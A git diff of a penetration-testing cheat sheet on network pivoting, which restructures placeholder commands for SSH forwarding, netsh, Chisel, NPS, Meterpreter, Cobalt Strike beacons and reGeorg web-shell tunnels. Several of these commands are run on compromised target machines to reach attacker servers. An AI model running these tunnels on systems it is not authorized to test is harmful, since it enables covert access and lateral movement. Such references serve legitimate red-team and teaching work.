@@ -104,7 +104,9 @@ In `metasploit`, the
 `setg Proxies socks4:<127.0.0.1 | IP>:<SOCKS_PROXY_PORT>`
 command can be used to tunnel modules through a `SOCKS` proxy.
 
-### SSH
+### Pivoting with built-in utilities
+
+#### [Linux] SSH
 
 SSH port forwarding is a mechanism that allows for connection tunneling
 through a SSH service.
@@ -112,12 +114,12 @@ through a SSH service.
 They are three main types of SSH port forwarding: local port forwarding, remote
 port forwarding and dynamic port forwarding.
 
-###### Local port forwarding
+###### SSH local port forwarding
 
 The following command can be used to configure a local port forwarding through
 an SSH service:
 
-```
+```bash
 # -n: no keyboard input to be expected (redirects stdin from /dev/null, actually preventing reading from stdin)
 # -N & -T: prevents the opening of a tty session and specify that no command be executed
 
@@ -130,136 +132,124 @@ accessible locally on the attacking machine at the `<LOCAL_PORT>`.
 Note: local port forwarding can be used to access locally (`localhost`) exposed
 services on the SSH server.
 
-###### Remote port forwarding
+###### SSH remote port forwarding
 
 The following command can be used to configure a remote port forwarding through
 an SSH service:
 
-```
+```bash
 ssh -R <TARGET_REMOTE_PORT>:<TARGET_HOSTNAME | TARGET_IP>:<SSH_SERVER_LOCAL_PORT> <USERNAME>@<SSH_HOSTNAME | SSH_IP>
 ```
 
-###### Dynamic ports forwarding
+###### SSH dynamic ports forwarding
 
 The following commands can be used to configure the SSH service in proxy mode
 and redirect tools connections through it:
 
-```
+```bash
 ssh -nNT -D <LOCAL_PORT> <USERNAME>@<SSH_HOSTNAME | SSH_IP>
 ```
 
-### Meterpreter
+#### [Windows] netsh
 
-###### Unitary port forwarding
+On Windows, the `netsh` built-in can be used to configure unitary port
+forwarding.
 
-The `portfwd` command from within the `meterpreter` shell can be used to forward
-TCP connections through a compromised machine.
+As stated in the Microsoft `KB555744`, "the [`portproxy add v4tov4]` command is
+sent to the `IPV6MON.DLL` helper, and because of that it will work only if
+`IPv6` protocol is installed."
 
-Usage:
+```bash
+# Display current configured port forwarding rule
+netsh interface portproxy show all
 
-```
-portfwd [add | delete | list | flush] [args]
-
-# List active port forwards
-portfwd list
-
-# Add port forward
-portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r <REMOTE_HOST>
-
-# Delete specific port forward
-portfw delete -i <INDEX>
-
-# Delete all port forwards
-portfw flush
+# Configure a local port forwarding
+netsh interface portproxy add v4tov4 listenaddress=<LHOST> listenport=<LPORT> connectaddress=<RHOST> connectport=<RPORT>
 ```
 
-###### Dynamic port forwarding
+#### [Linux] iptables
 
-Contrary to unitary port forwarding, dynamic port forwarding allows for the
-complete tunneling of full IP and ports range. The `autoroute` command from
-within the `meterpreter` shell can be used to forward TCP connections through a
-compromised machine.
+TODO
 
-### Cobalt Strike
+### Pivoting with fully-fledged tools or C2 agents
 
-`Cobalt Strike` supports the following pivoting mechanisms:
-  - Pivot listeners
-  - Dynamic ports forwarding through a SOCKS proxy
-  - VPN access
+#### Chisel
 
-###### Pivot listeners
+*Recommended fully-fledged tool for its ease of use if no C2 is being used.*
 
-`Cobalt Strike`'s `pivot listeners` are listeners started on compromised
-systems to chain beacons communication in an internal Information System (IS).
-The `pivot listener` will serve as a pass-through between further beacons and
-the C2 listeners in order to minimize the number of beacons connections to the
-C2 servers or compromise systems that couldn't otherwise reach the C2 servers.
+`Chisel` is a fast `TCP` / `UDP` encapsulation `Go` tool that transport
+`SSH`-encrypted traffic over `HTTP`. It supports mutual client / server
+authentication and numerous user-experience features (client auto-reconnects,
+multiple tunnel over one TCP connection, etc.).
 
-A pivot listener can be started on a beacon using the beacon built-in function
-`[beacon] -> Pivoting -> Listeners...`.
+```bash
+# Generic server-side usage (on the attacking machine).
+# Defaults to listening on all interfaces on port TCP 8080.
+# Option --reverse: allow clients to specify reverse port forwarding (required for remote port forwarding and SOCKS proxy with "R:" in <REMOTE>).
+# Option --socks: allow clients to access the internal SOCKS5 proxy.
+chisel server [--host <0.0.0.0 | SERVER_IP>] [-p <8080 | PORT>] [<OPTIONS>]
 
-As of now, `pivot listeners` can only be of type `windows\beacon_reverse_tcp`
-and do not support stager payloads.
+# Generic client-side usage (on the target machine).
+# <REMOTE> represents a local / remote port forward or SOCKS proxy (detailed below)
+chisel client <SERVER_IP>:<SERVER_PORT> <REMOTE>[/<TCP | UPD>]
+```
 
-Note that the functionally does not automatically update the system host-based
-firewall configuration and a manual modification of the firewall rules may be
-necessary in order to allow inbound traffic on the listener port.
+###### Chisel local port forwarding
 
-###### SOCKS proxy
+Local port forwarding to make accessible the service from the server on
+`<SERVER_FORWARDED_IP>:<SERVER_FORWARDED_PORT>` to the client on
+`<CLIENT_TUNNEL_IP>:<CLIENT_TUNNEL_PORT>`. `<SERVER_FORWARDED_IP>` can be
+localhost or any IP or host such as a host exposing a website on the Internet.
 
-A `SOCKS4` proxy service can be started on a beacon using the beacon built-in
-function `[beacon] -> Pivoting -> SOCKS Server` or through the beacon CLI using
-`socks <C2_LOCAL_SOCK_PORT>`.
+```bash
+# chisel server-side (on the attacking machine).
+chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>]
 
-The actives `SOCKS4` proxies can be viewed and managed through the `View ->
-Proxy Pivots` interface. All the `SOCKS4` proxies running on a beacon can also
-be stopped directly through the beacon CLI using `socks <SOCK_PORT>`.
+# chisel client-side (on the target machine).
+# By default the port is opened client-side on all interfaces (<CLIENT_TUNNEL_IP> = 0.0.0.0) with a local (client-side) port matching the one of the forwarded service (<CLIENT_TUNNEL_PORT> = <SERVER_FORWARDED_PORT>).
+# Example: www.github.com:443 (<SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>) to make GitHub accessible on the compromised client.  
+chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>
+chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>
+chisel client <SERVER_IP>:<SERVER_PORT> <HOSTNAME | IP> <CLIENT_TUNNEL_IP>:<CLIENT_TUNNEL_PORT>:<SERVER_FORWARDED_IP>:<SERVER_FORWARDED_PORT>
+```
+
+###### Chisel remote port forwarding
+
+Remote port forwarding to forward traffic received server-side on
+`<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>` to `<REMOTE_HOST>:<REMOTE_PORT>`
+through the client. `<REMOTE_HOST>` can be localhost or any IP such as one
+accessible in the internal network from the compromised client.
+
+```bash
+# chisel server-side (on the attacking machine).
+chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse
+
+# chisel client-side (on the target machine).
+# By default the port is opened server-side on localhost (<SERVER_HOST> = 127.0.0.1) with a local (server-side) port matching the one the traffic is routed to (<REMOTE_PORT> = <SERVER_TUNNEL_PORT>).
+chisel client <SERVER_IP>:<SERVER_PORT> R:<REMOTE_HOST>:<REMOTE_PORT>
+chisel client <SERVER_IP>:<SERVER_PORT> R:<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>:<REMOTE_HOST>:<REMOTE_PORT>
+```
+
+###### Chisel SOCKS proxy
+
+Establish a `SOCKS` proxy that can be used server-side to channel traffic
+through the compromised client:
+
+```bash
+# chisel server-side (on the attacking machine).
+chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse
+
+# chisel client-side (on the target machine).
+# By default the SOCKS proxy listen server-side on 127.0.0.1:1080 (<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>).
+chisel client <SERVER_IP>:<SERVER_PORT> R:socks
+chisel client <SERVER_IP>:<SERVER_PORT> R:<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>:socks
+```
 
 Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
 information on how to make use of the `SOCKS` proxy, using `proxychains` or
 through `metasploit`.
 
-###### CovertVPN pivoting
-
-`This feature does not work on Windows 10 systems.`<br/>
-`Require Administrator privileges on the compromised system.`
-
-The `Cobalt Strike` `CovertVPN` feature is a layer 2 pivoting capability that
-deploy a network interface on the C2 server and bridge it, through a running
-beacon, to a compromised system network. While the traffic can be channeled
-over the `TCP`, `HTTP` and `ICMP` protocols, the use of the `UDP` protocol is
-recommended for performance optimization.
-
-A `CovertVPN` pivot can be started on a beacon using the beacon built-in
-function `[beacon] -> Pivoting -> Deploy VPN` or through the beacon CLI using
-`covertvpn <INTERFACE_NAME> <BEACON_IP_NETWORK>`. If the `Clone host MAC
-address` option is checked, the network interface deployed on the C2 server
-will have the same MAC address as the compromised system network interface.
-
-The actives `CovertVPN` pivots can be viewed and managed through the
-`Cobalt Strike -> VPN Interfaces` menu.
-
-Once up and running, the network interface on the C2 server will require
-further configuration, such as specifying an IP address, in order to reach the
-network it is attached to. This configuration may be done either automatically
-through the `Dynamic Host Configuration Protocol (DHCP)` protocol, if a `DHCP`
-server is reachable on the network, or manually.
-
-```
-# Verification of the presence of the CovertVPN network interface on the C2 server
-ifconfig <INTERFACE_NAME>
-
-# Automatic configuration of the CovertVPN network interface using the internal DHCP server
-dhclient <INTERFACE_NAME>
-
-# Manual setting of an IP address and default gateway, can be used if a DHCP server is not available or for a more covert approach
-# The beacon network interface information can be retrived using the "run ipconfig" command
-# Specifying a default gateway for the network interface is needed to reach systems outside of the (Virtual) Local Area Network ((V)LAN)  
-ifconfig <INTERFACE_NAME> <IP> netmask <255.255.255.0 | NETWORK_NETMASK> up
-ip route add default via <IP> dev <INTERFACE_NAME>
-```
-
-### NPS
+#### NPS
 
 `NPS` is a high-performance proxy server suite, analogous to a C2 framework,
 with cross-platforms agents and a web management interface. It supports
@@ -291,9 +281,8 @@ web_key_file=<KEY_FULL_PATH>
 
 Server startup and initial client connection to the server:
 
-```
+```bash
 # Server side
-
 nps start / restart
 
 # A client must first be configured through the web management interface in order to receive a client callback.
@@ -304,9 +293,8 @@ The "Unique verify key" is needed for the client callback.
 The callback command may be copied directly (as displayed after clicking on the "+" sign in front of the client).
 
 # Client side
-
 # ./npc on Linux or npc.exe on Windows.
-./npc -server=<IP>:<8024 : SERVER_BRIDGE_PORT> -vkey=<UNIQUE_VERIFY_KEY> -type=tcp
+npc -server=<IP>:<8024 : SERVER_BRIDGE_PORT> -vkey=<UNIQUE_VERIFY_KEY> -type=tcp
 ```
 
 Once a client has established a session with the server, the following pivoting
@@ -325,14 +313,127 @@ Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
 information on how to make use of the `SOCKS` proxy, using `proxychains` or
 through `metasploit`.
 
-### Web TCP tunnel
+#### Meterpreter
 
-`reGeorg` and `ABPTTS` can be used to act as socks proxies and tunnel TCP
-traffic over an HTTP/HTTPS connection made to a web application. A web page /
-package must be deployed and executed by the web server, in similar fashion as
-a classical web shell.
+###### Meterpreter's unitary port forwarding
 
-###### reGeorg
+The `portfwd` command from within the `meterpreter` shell can be used to forward
+TCP connections through a compromised machine.
+
+```
+portfwd [add | delete | list | flush] [args]
+
+# List active port forwards
+portfwd list
+
+# Add port forward
+portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r <REMOTE_HOST>
+
+# Delete specific port forward
+portfw delete -i <INDEX>
+
+# Delete all port forwards
+portfw flush
+```
+
+###### Meterpreter's dynamic port forwarding
+
+Contrary to unitary port forwarding, dynamic port forwarding allows for the
+complete tunneling of full IP and ports range. The `autoroute` command from
+within the `meterpreter` shell can be used to forward TCP connections through a
+compromised machine.
+
+```
+TODO
+```
+
+#### Cobalt Strike
+
+`Cobalt Strike` supports the following pivoting mechanisms:
+  - Pivot listeners
+  - Dynamic ports forwarding through a SOCKS proxy
+  - VPN access
+
+###### Cobalt Strike's pivot listeners
+
+`Cobalt Strike`'s `pivot listeners` are listeners started on compromised
+systems to chain beacons communication in an internal Information System (IS).
+The `pivot listener` will serve as a pass-through between further beacons and
+the C2 listeners in order to minimize the number of beacons connections to the
+C2 servers or compromise systems that couldn't otherwise reach the C2 servers.
+
+A pivot listener can be started on a beacon using the beacon built-in function
+`[beacon] -> Pivoting -> Listeners...`.
+
+As of now, `pivot listeners` can only be of type `windows\beacon_reverse_tcp`
+and do not support stager payloads.
+
+Note that the functionally does not automatically update the system host-based
+firewall configuration and a manual modification of the firewall rules may be
+necessary in order to allow inbound traffic on the listener port.
+
+###### Cobalt Strike's SOCKS proxy
+
+A `SOCKS4` proxy service can be started on a beacon using the beacon built-in
+function `[beacon] -> Pivoting -> SOCKS Server` or through the beacon CLI using
+`socks <C2_LOCAL_SOCK_PORT>`.
+
+The actives `SOCKS4` proxies can be viewed and managed through the `View ->
+Proxy Pivots` interface. All the `SOCKS4` proxies running on a beacon can also
+be stopped directly through the beacon CLI using `socks <SOCK_PORT>`.
+
+Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
+information on how to make use of the `SOCKS` proxy, using `proxychains` or
+through `metasploit`.
+
+###### Cobalt Strike's CovertVPN
+
+`This feature does not work on Windows 10 systems.`<br/>
+`Require Administrator privileges on the compromised system.`
+
+The `Cobalt Strike` `CovertVPN` feature is a layer 2 pivoting capability that
+deploy a network interface on the C2 server and bridge it, through a running
+beacon, to a compromised system network. While the traffic can be channeled
+over the `TCP`, `HTTP` and `ICMP` protocols, the use of the `UDP` protocol is
+recommended for performance optimization.
+
+A `CovertVPN` pivot can be started on a beacon using the beacon built-in
+function `[beacon] -> Pivoting -> Deploy VPN` or through the beacon CLI using
+`covertvpn <INTERFACE_NAME> <BEACON_IP_NETWORK>`. If the `Clone host MAC
+address` option is checked, the network interface deployed on the C2 server
+will have the same MAC address as the compromised system network interface.
+
+The actives `CovertVPN` pivots can be viewed and managed through the
+`Cobalt Strike -> VPN Interfaces` menu.
+
+Once up and running, the network interface on the C2 server will require
+further configuration, such as specifying an IP address, in order to reach the
+network it is attached to. This configuration may be done either automatically
+through the `Dynamic Host Configuration Protocol (DHCP)` protocol, if a `DHCP`
+server is reachable on the network, or manually.
+
+```bash
+# Verification of the presence of the CovertVPN network interface on the C2 server
+ifconfig <INTERFACE_NAME>
+
+# Automatic configuration of the CovertVPN network interface using the internal DHCP server
+dhclient <INTERFACE_NAME>
+
+# Manual setting of an IP address and default gateway, can be used if a DHCP server is not available or for a more covert approach
+# The beacon network interface information can be retrived using the "run ipconfig" command
+# Specifying a default gateway for the network interface is needed to reach systems outside of the (Virtual) Local Area Network ((V)LAN)  
+ifconfig <INTERFACE_NAME> <IP> netmask <255.255.255.0 | NETWORK_NETMASK> up
+ip route add default via <IP> dev <INTERFACE_NAME>
+```
+
+### Pivoting over Web TCP tunnel
+
+`reGeorg` and `ABPTTS` can be used to act as socks proxies and tunnel `TCP`
+traffic over an `HTTP` / `HTTPS` connection made to a web application. A web
+page / package must be deployed and executed by the web server, in similar
+fashion as a classical web shell.
+
+#### reGeorg
 
 `reGeorg` supports the following web application / languages:
   - ashx
@@ -344,29 +445,10 @@ a classical web shell.
 
 Once the page / package is deployed, `reGeorg` socks server can be started:
 
-```
+```bash
 python reGeorgSocksProxy.py -p <LOCAL_SOCKS_PROXY_PORT> -u <http | https>://<HOSTNAME | IP>/<PATH>/<tunnel.xx>
 ```
 
 Refer to the `Overview - SOCKS proxy pivots` paragraph above for more
 information on how to make use of the `SOCKS` proxy, using `proxychains` or
 through `metasploit`.
-
-### [Windows] netsh
-
-On Windows, the `netsh` built-in can be used to configure unitary port
-forwarding.
-
-As stated in the Microsoft `KB555744`, "the [`portproxy add v4tov4]` command is
-sent to the `IPV6MON.DLL` helper, and because of that it will work only if
-`IPv6` protocol is installed."
-
-```
-# Display current configured port forwarding rule
-netsh interface portproxy show all
-
-# Configure a local port forwarding
-netsh interface portproxy add v4tov4 listenaddress=<LHOST> listenport=<LPORT> connectaddress=<RHOST> connectport=<RPORT>
-```
-
-### [Linux] iptables
